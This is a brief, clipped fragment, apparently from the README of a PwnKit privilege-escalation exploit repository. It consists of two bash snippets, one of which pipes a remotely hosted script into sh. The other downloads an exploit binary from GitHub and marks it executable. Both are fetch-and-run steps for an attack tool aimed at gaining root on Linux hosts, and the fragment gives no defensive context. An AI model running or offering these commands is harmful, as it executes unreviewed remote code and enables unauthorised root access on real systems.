...
```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ganlinniangwtf/PwnKit/main/PwnKit.sh)"
```
...
```bash
curl -fsSL https://raw.githubusercontent.com/ganlinniangwtf/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit
